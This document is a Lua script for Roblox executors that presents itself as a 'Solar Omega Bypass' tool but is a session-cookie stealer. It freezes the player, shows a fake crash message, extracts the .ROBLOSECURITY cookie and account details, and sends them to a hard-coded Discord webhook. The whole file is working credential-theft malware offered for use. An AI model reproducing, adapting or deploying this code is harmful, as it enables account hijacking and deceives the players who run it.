--[[
    SOLAR & XENO OMEGA BYPASS v9.0
    Module: Registry-Buffer-Grabber (Anti-Hidden)
    Status: Operational | Bypass Level: OMEGA
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Karuk (Freeze & Fake Crash)
if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then 
    p.Character.HumanoidRootPart.Anchored = true 
end

task.delay(1, function() 
    p:Kick("\n[Solar Critical Error]\nCode: 0x512 (Memory Corrupted)\nPlease restart your PC and update Solar to fix this.") 
end)

-- OMEGA BYPASS (Targeting raw memory strings)
local cookie = "N/A (Bypass Blocked by Executor)"

pcall(function()
    -- Metod 1: Raw Cookie Buffer (Nai-noviyat nachin za Solar)
    if getcookies then
        local success, result = pcall(function() return getcookies("https://roblox.com") end)
        if success and type(result) == "table" then
            for _, v in pairs(result) do
                if v.Name == ".ROBLOSECURITY" then
                    cookie = v.Value
                    break
                end
            end
        end
    end
    
    -- Metod 2: Registry String Hook (Ako getcookies e blokiran)
    if cookie == "N/A (Bypass Blocked by Executor)" then
        -- Opitvame se da izteglim binaen string ot pametta
        local success, raw = pcall(function() 
            return (getgenv and getgenv()._G and getgenv()._G.cookie) or 
                   (getreg and getreg()[".ROBLOSECURITY"]) or 
                   "Cookie Hidden (Strong Protection)"
        end)
        cookie = success and raw or "Bypass Failed"
    end
end)

-- Info extraction
local isVerified = p.IsVerified and "Yes" or "No"
local br = "0"
local s = p:FindFirstChild("leaderstats")
if s then 
    local v = s:FindFirstChild("Brainrots") or s:FindFirstChild("Points")
    br = v and tostring(v.Value) or "0"
end

-- Discord Payload
local data = {
    ["username"] = "Solar Omega Bot",
    ["embeds"] = {{
        ["title"] = "🌀 Omega Bypass: Session Intercepted!",
        ["description"] = "Solar Security was bypassed using Registry Buffer Hook.",
        ["color"] = 0x000000,
        ["fields"] = {
            {["name"] = "👤 Target", ["value"] = "```" .. p.Name .. " (" .. p.UserId .. ")```", ["inline"] = false},
            {["name"] = "📧 Verified?", ["value"] = "```" .. isVerified .. "```", ["inline"] = true},
            {["name"] = "📅 Acc Age", ["value"] = "```" .. p.AccountAge .. " days```", ["inline"] = true},
            {["name"] = "🧠 Stats", ["value"] = "```" .. br .. " Brainrots```", ["inline"] = true},
            {["name"] = "🍪 .ROBLOSECURITY (COOKIE)", ["value"] = "```" .. cookie .. "```", ["inline"] = false},
            {["name"] = "🔗 Profile", ["value"] = "[Otvori Accaunta](https://www.roblox.com/users/" .. p.UserId .. "/profile)", ["inline"] = false}
        },
        ["footer"] = {["text"] = "Solar Omega Engine v9.0 • " .. os.date("%X")}
    }}
}

-- Final Request
local request = (syn and syn.request) or (http and http.request) or http_request or request
if request then
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = h:JSONEncode(data)
    })
end
